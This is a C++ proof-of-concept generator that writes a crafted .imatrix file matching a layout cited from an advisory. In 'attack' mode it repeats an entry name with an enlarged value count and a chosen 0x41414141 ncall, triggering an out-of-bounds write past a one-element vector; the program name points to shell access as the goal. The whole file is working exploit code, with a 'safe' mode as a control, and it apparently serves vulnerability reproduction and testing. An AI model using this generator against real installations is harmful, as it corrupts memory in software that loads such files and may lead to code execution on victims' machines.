// sdimatrix2shell — deterministic .imatrix generator.
// Layout is the one documented in GHSA-6q7q-2v9c-x8m7:
// int32 n_entries, then per entry int32 len, len name bytes,
// int32 ncall, int32 nval, nval x float32.
#include <cstdlib>
#include <cstdint>
#include <cstdio>
#include <cstring>

static void put_int(FILE* f, int32_t v) {
    if (fwrite(&v, sizeof(v), 1, f) != 1) {
        std::fputs("write failed\n", stderr);
        std::exit(1);
    }
}

static void put_name(FILE* f, const char* name) {
    int32_t len = (int32_t)std::strlen(name);
    put_int(f, len);
    if (fwrite(name, 1, (size_t)len, f) != (size_t)len) {
        std::fputs("write failed\n", stderr);
        std::exit(1);
    }
}

static void put_float_bits(FILE* f, uint32_t bits) {
    float value;
    std::memcpy(&value, &bits, sizeof(value));
    if (fwrite(&value, sizeof(value), 1, f) != 1) {
        std::fputs("write failed\n", stderr);
        std::exit(1);
    }
}

int main(int argc, char** argv) {
    if (argc != 3) {
        std::fputs("usage: mkinput OUTPUT attack|safe\n", stderr);
        return 2;
    }
    const bool attack = std::strcmp(argv[2], "attack") == 0;
    FILE* f = std::fopen(argv[1], "wb");
    if (!f) {
        std::perror("fopen");
        return 2;
    }

    put_int(f, 2);                       // n_entries
    put_name(f, "blk.0");
    put_int(f, 0x41414141);              // ncall: chosen int for OOB counts writes
    put_int(f, 1);                       // nval
    put_float_bits(f, 0x11111111u);

    put_name(f, attack ? "blk.0" : "blk.1");  // duplicate name is the trigger
    put_int(f, 0x41414141);              // chosen ncall on the repeated entry
    put_int(f, attack ? 3 : 1);          // larger second nval
    if (attack) {
        for (int i = 0; i < 3; ++i) {
            // tmp[1] float bytes land past the 1-element values vector.
            put_float_bits(f, i == 1 ? 0x5a5a5a5au : (0x3f800000u + (uint32_t)i));
        }
    } else {
        put_float_bits(f, 0x22222222u);
    }

    if (std::fclose(f) != 0) {
        std::perror("fclose");
        return 2;
    }
    return 0;
}
